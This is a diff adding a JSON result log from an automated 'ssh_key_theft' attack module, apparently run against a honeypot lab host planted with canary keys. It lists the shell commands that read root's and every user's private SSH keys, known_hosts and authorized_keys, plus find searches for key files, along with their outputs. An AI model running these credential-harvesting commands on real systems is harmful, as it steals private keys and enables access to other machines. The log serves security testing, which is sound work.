@@ -1,0 +1,173 @@
+{
+  "timestamp": 1785846706.2372632,
+  "target_ip": "172.24.0.2",
+  "source": "ssh_key_theft",
+  "data": {
+    "severity": "HIGH",
+    "elapsed": 2.6844263076782227,
+    "mitres": [
+      {
+        "name": "Unsecured Credentials: Private Keys",
+        "mitre_id": "T1552.004",
+        "mitre_tactic": "Credential Access",
+        "description": "Vol de clés privées SSH (~/.ssh/id_rsa) pour accéder à d'autres systèmes sans authentification."
+      }
+    ],
+    "results": {
+      "stolen_keys": [
+        {
+          "name": "id_rsa",
+          "source": "admin",
+          "type": "OpenSSH",
+          "encrypted": false,
+          "usable": false,
+          "content": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA THIS_IS_A_FAKE_HONEYPOT_KEY_SHIELDAI_CANARY AAAAB\n3NzaC1yc2EAAAADAQABAAABgQDFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFake\nKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKey\nFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFake\nCANARY_TOKEN_ROOT_SSH_SHIELDAI_MONITORING_ACTIVE\n-----END OPENSSH PRIVATE KEY-----",
+          "content_preview": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA THIS_IS_A_FAKE_HONE...",
+          "cmd": "cat ~/.ssh/id_rsa 2>/dev/null || echo 'ID_RSA_DENIED'",
+          "cat_in_cmd": true
+        },
+        {
+          "name": "id_rsa",
+          "source": "root",
+          "type": "OpenSSH",
+          "encrypted": false,
+          "usable": false,
+          "content": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA THIS_IS_A_FAKE_HONEYPOT_KEY_SHIELDAI_CANARY AAAAB\n3NzaC1yc2EAAAADAQABAAABgQDFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFake\nKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKey\nFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFake\nCANARY_TOKEN_ROOT_SSH_SHIELDAI_MONITORING_ACTIVE\n-----END OPENSSH PRIVATE KEY-----",
+          "content_preview": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA THIS_IS_A_FAKE_HONE...",
+          "cmd": "cat /root/.ssh/id_rsa 2>/dev/null || echo 'ROOT_ID_RSA_DENIED'",
+          "cat_in_cmd": true
+        },
+        {
+          "name": "id_rsa",
+          "source": "admin",
+          "type": "OpenSSH",
+          "encrypted": false,
+          "usable": false,
+          "content": "=== appservice ===\n=== dbadmin ===\n=== deploy ===\nid_rsa\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA FAKE_DEPLOY_KEY_CANARY_SHIELDAI_MONITOR AAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nCANARY_DEPLOY_SSH_KEY_SHIELDAI_MONITORING_ACTIVE\n-----END OPENSSH PRIVATE KEY-----\n=== devops ===\nconfig\nid_rsa\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA FAKE_DEVOPS_KEY_SHIELDAI_CANARY_TOKEN AAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nCANARY_DEVOPS_SSH_PRIVATE_KEY_SHIELDAI_MONITOR_ACTIVE_DO_NOT_EXFILTRATE\n-----END OPENSSH PRIVATE KEY-----\n=== monitor ===\n=== sandbox ===\nknown_hosts",
+          "content_preview": "=== appservice ===\n=== dbadmin ===\n=== deploy ===\nid_rsa\n-----BEGIN OPENSSH PRIV...",
+          "cmd": "for u in $(ls /home/ 2>/dev/null); do echo \"=== $u ===\"; ls /home/$u/.ssh/ 2>/dev/null; cat /home/$u/.ssh/id_rsa 2>/dev/null; cat /home/$u/.ssh/id_ed25519 2>/dev/null; done",
+          "cat_in_cmd": true
+        }
+      ],
+      "stolen_keys_count": 3,
+      "usable_keys": [],
+      "usable_keys_count": 0,
+      "known_hosts": [
+        {
+          "host": "10.0.2.10",
+          "port": 22
+        },
+        {
+          "host": "10.0.5.10",
+          "port": 22
+        },
+        {
+          "host": "db-primary.internal",
+          "port": 22
+        },
+        {
+          "host": "10.0.2.10",
+          "port": 22
+        },
+        {
+          "host": "10.0.5.10",
+          "port": 22
+        },
+        {
+          "host": "db-primary.internal",
+          "port": 22
+        }
+      ],
+      "known_hosts_count": 6,
+      "commands": {
+        "ls -la ~/.ssh/ 2>/dev/null || echo 'SSH_DIR_DENIED'": {
+          "stdout": "total 28\ndrwx------.  2 root root 4096 May 31 10:10 .\ndrwx------. 18 root root 4096 May 31 10:14 ..\n-rw-------.  1 root root  281 May 31 09:23 authorized_keys\n-rw-------.  1 root root  416 May 31 09:23 id_rsa\n-rw-r--r--.  1 root root  178 May 31 09:23 id_rsa.pub\n-rw-------.  1 root root 1386 May 31 10:11 known_hosts\n-rw-r--r--.  1 root root  408 May 31 10:05 known_hosts.old\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "ls -la /root/.ssh/ 2>/dev/null || echo 'ROOT_SSH_DIR_DENIED'": {
+          "stdout": "total 28\ndrwx------.  2 root root 4096 May 31 10:10 .\ndrwx------. 18 root root 4096 May 31 10:14 ..\n-rw-------.  1 root root  281 May 31 09:23 authorized_keys\n-rw-------.  1 root root  416 May 31 09:23 id_rsa\n-rw-r--r--.  1 root root  178 May 31 09:23 id_rsa.pub\n-rw-------.  1 root root 1386 May 31 10:11 known_hosts\n-rw-r--r--.  1 root root  408 May 31 10:05 known_hosts.old\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat ~/.ssh/id_rsa 2>/dev/null || echo 'ID_RSA_DENIED'": {
+          "stdout": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA THIS_IS_A_FAKE_HONEYPOT_KEY_SHIELDAI_CANARY AAAAB\n3NzaC1yc2EAAAADAQABAAABgQDFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFake\nKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKey\nFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFake\nCANARY_TOKEN_ROOT_SSH_SHIELDAI_MONITORING_ACTIVE\n-----END OPENSSH PRIVATE KEY-----\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat ~/.ssh/id_ed25519 2>/dev/null || echo 'ID_ED25519_DENIED'": {
+          "stdout": "ID_ED25519_DENIED\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat ~/.ssh/id_ecdsa 2>/dev/null || echo 'ID_ECDSA_DENIED'": {
+          "stdout": "ID_ECDSA_DENIED\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat ~/.ssh/id_dsa 2>/dev/null || echo 'ID_DSA_DENIED'": {
+          "stdout": "ID_DSA_DENIED\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat /root/.ssh/id_rsa 2>/dev/null || echo 'ROOT_ID_RSA_DENIED'": {
+          "stdout": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA THIS_IS_A_FAKE_HONEYPOT_KEY_SHIELDAI_CANARY AAAAB\n3NzaC1yc2EAAAADAQABAAABgQDFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFake\nKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKey\nFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFake\nCANARY_TOKEN_ROOT_SSH_SHIELDAI_MONITORING_ACTIVE\n-----END OPENSSH PRIVATE KEY-----\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat /root/.ssh/id_ed25519 2>/dev/null || echo 'ROOT_ID_ED25519_DENIED'": {
+          "stdout": "ROOT_ID_ED25519_DENIED\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat /root/.ssh/id_ecdsa 2>/dev/null || echo 'ROOT_ID_ECDSA_DENIED'": {
+          "stdout": "ROOT_ID_ECDSA_DENIED\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat ~/.ssh/known_hosts 2>/dev/null || echo 'KNOWN_HOSTS_DENIED'": {
+          "stdout": "10.0.2.10 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFakeKnownHostKey1FakeKnownHostKey1FakeKnownHostKey1==\n10.0.5.10 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeKnownHostKey2FakeKnownHostKey2==\ndb-primary.internal ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFakeKnownHostKey3==\n|1|2HBDKz1yIe0LaSAp7ZVzx/H+wkg=|+nf/k1FUU3G7QvptzIkbol2dR+c= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPnaw37cbhF1JshXJolisPPEGTnS5HVu5+w/MvePvJEK\n|1|TFU+sgDHFgub5SgXghioFvOCefg=|rHUfzqOjeLX2HJoKOYX6v/LfG1M= ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDU5WK5GLJ84MtYqF/FM+yhEvvb+NUetnqibfq+g9NGicuS8B43EZi8uTH83HQjvmdeumdgCIyXzHp7TnTQ12/TbVO4LejZsoiyVHUcBCF4vo0VjTye3/LimOWrVNT9EuZ4bVpxKd9Jgl2cx2bakiNb48XcwtBqBoai7fafBcBD028Coku/jk6xo3+KETTD39893+IqCbsJ2ZZTbLnvGLdz7KY6lbYKqPCFFo9MinwMSBjdy4XOZ+mIGzQrgOGa5kAXeH/PNP+QKt0M2ztc2s1qVu0ub2Xy2W2OKtoJrv9EJwoXyBp0jt4nqmMjFyI0CB9SbGAGfoWSGmu2/RrSbUW2T4pKg4wq7n9OeY1qCzNg79VCUJ1h2Q2OEtl21mYcnUrTb5hjKhF7Q9BWyiIgow4gl75qPtWHNBfYvQfw/Xr5TC9Cpxo0RjKLCLt72W8buL1ZCfVb2u1TMSdAu7fdJh4r3prqBB+TgGMvzNU5SXtR/EmzRtKYsgfuAJDp/OUOn6k=\n|1|TK2IPO1n0bDsyCXCjztsBKGLfg4=|4QFVGPrRyd4PjRwBKJez2UVL+TE= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBPG0YLbUCnOzRBVNhKdUdQUycx73uRfkvVD1l9yyXcQZLh/rPCj3qSLcwNLqq3YhlVusfmmPsAljAgL+o0VZEc=\n|1|KrLWJi5T08gCBf3taQ4lpOEQC8E=|mPhjibLi4kGD+N0NIsgI5BMfV/A= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPnaw37cbhF1JshXJolisPPEGTnS5HVu5+w/MvePvJEK\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat /root/.ssh/known_hosts 2>/dev/null || echo 'ROOT_KNOWN_HOSTS_DENIED'": {
+          "stdout": "10.0.2.10 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFakeKnownHostKey1FakeKnownHostKey1FakeKnownHostKey1==\n10.0.5.10 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeKnownHostKey2FakeKnownHostKey2==\ndb-primary.internal ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFakeKnownHostKey3==\n|1|2HBDKz1yIe0LaSAp7ZVzx/H+wkg=|+nf/k1FUU3G7QvptzIkbol2dR+c= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPnaw37cbhF1JshXJolisPPEGTnS5HVu5+w/MvePvJEK\n|1|TFU+sgDHFgub5SgXghioFvOCefg=|rHUfzqOjeLX2HJoKOYX6v/LfG1M= ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDU5WK5GLJ84MtYqF/FM+yhEvvb+NUetnqibfq+g9NGicuS8B43EZi8uTH83HQjvmdeumdgCIyXzHp7TnTQ12/TbVO4LejZsoiyVHUcBCF4vo0VjTye3/LimOWrVNT9EuZ4bVpxKd9Jgl2cx2bakiNb48XcwtBqBoai7fafBcBD028Coku/jk6xo3+KETTD39893+IqCbsJ2ZZTbLnvGLdz7KY6lbYKqPCFFo9MinwMSBjdy4XOZ+mIGzQrgOGa5kAXeH/PNP+QKt0M2ztc2s1qVu0ub2Xy2W2OKtoJrv9EJwoXyBp0jt4nqmMjFyI0CB9SbGAGfoWSGmu2/RrSbUW2T4pKg4wq7n9OeY1qCzNg79VCUJ1h2Q2OEtl21mYcnUrTb5hjKhF7Q9BWyiIgow4gl75qPtWHNBfYvQfw/Xr5TC9Cpxo0RjKLCLt72W8buL1ZCfVb2u1TMSdAu7fdJh4r3prqBB+TgGMvzNU5SXtR/EmzRtKYsgfuAJDp/OUOn6k=\n|1|TK2IPO1n0bDsyCXCjztsBKGLfg4=|4QFVGPrRyd4PjRwBKJez2UVL+TE= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBPG0YLbUCnOzRBVNhKdUdQUycx73uRfkvVD1l9yyXcQZLh/rPCj3qSLcwNLqq3YhlVusfmmPsAljAgL+o0VZEc=\n|1|KrLWJi5T08gCBf3taQ4lpOEQC8E=|mPhjibLi4kGD+N0NIsgI5BMfV/A= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPnaw37cbhF1JshXJolisPPEGTnS5HVu5+w/MvePvJEK\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat ~/.ssh/authorized_keys 2>/dev/null || echo 'AUTHORIZED_KEYS_DENIED'": {
+          "stdout": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKey== root@prod-bastion-01\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeEd25519KeyFakeEd25519KeyFakeEd25519Key devops@workstation\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat /root/.ssh/authorized_keys 2>/dev/null || echo 'ROOT_AUTHORIZED_KEYS_DENIED'": {
+          "stdout": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFakeKey== root@prod-bastion-01\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeEd25519KeyFakeEd25519KeyFakeEd25519Key devops@workstation\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat ~/.ssh/config 2>/dev/null || echo 'SSH_CONFIG_DENIED'": {
+          "stdout": "SSH_CONFIG_DENIED\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' 2>/dev/null | grep -v '/proc\\|/sys\\|/dev' | head -20": {
+          "stdout": "/home/deploy/.ssh/id_rsa\n/root/.ssh/id_rsa\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "find / -name '*.pem' -o -name '*.key' 2>/dev/null | grep -v '/proc\\|/sys\\|/dev' | head -20": {
+          "stdout": "/usr/share/gnupg/sks-keyservers.netCA.pem\n/usr/share/php/data/Composer/res/cacert.pem\n/usr/share/dns/root.key\n/usr/lib/golang/src/crypto/x509/platform_root_cert.pem\n/usr/lib/golang/src/crypto/x509/platform_root_key.pem\n/usr/lib/ssl/cert.pem\n/usr/lib/python3/dist-packages/pip/_vendor/certifi/cacert.pem\n/usr/lib/python3/dist-packages/pipenv/patched/pip/_vendor/certifi/cacert.pem\n/usr/lib/python3/dist-packages/certifi/cacert.pem\n/usr/lib/python3/dist-packages/tornado/test/test.key\n/usr/lib/ruby/vendor_ruby/rubygems/ssl_certs/rubygems.org/GlobalSignRootCA_R3.pem\n/usr/lib/ruby/vendor_ruby/rubygems/ssl_certs/rubygems.org/GlobalSignRootCA.pem\n/etc/ssl/private/app.key\n/etc/ssl/private/ssl-cert-snakeoil.key\n/etc/ssl/certs/SSL.com_Root_Certification_Authority_ECC.pem\n/etc/ssl/certs/CommScope_Public_Trust_ECC_Root-02.pem\n/etc/ssl/certs/GTS_Root_R4.pem\n/etc/ssl/certs/Actalis_Authentication_Root_CA.pem\n/etc/ssl/certs/USERTrust_RSA_Certification_Authority.pem\n/etc/ssl/certs/vTrus_Root_CA.pem\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "for u in $(ls /home/ 2>/dev/null); do echo \"=== $u ===\"; ls /home/$u/.ssh/ 2>/dev/null; cat /home/$u/.ssh/id_rsa 2>/dev/null; cat /home/$u/.ssh/id_ed25519 2>/dev/null; done": {
+          "stdout": "=== appservice ===\n=== dbadmin ===\n=== deploy ===\nid_rsa\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA FAKE_DEPLOY_KEY_CANARY_SHIELDAI_MONITOR AAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nCANARY_DEPLOY_SSH_KEY_SHIELDAI_MONITORING_ACTIVE\n-----END OPENSSH PRIVATE KEY-----\n=== devops ===\nconfig\nid_rsa\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA FAKE_DEVOPS_KEY_SHIELDAI_CANARY_TOKEN AAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nCANARY_DEVOPS_SSH_PRIVATE_KEY_SHIELDAI_MONITOR_ACTIVE_DO_NOT_EXFILTRATE\n-----END OPENSSH PRIVATE KEY-----\n=== monitor ===\n=== sandbox ===\nknown_hosts\n",
+          "stderr": "",
+          "returncode": 1
+        }
+      },
+      "success_number": 17,
+      "success_rate": 1.0
+    }
+  }
+}
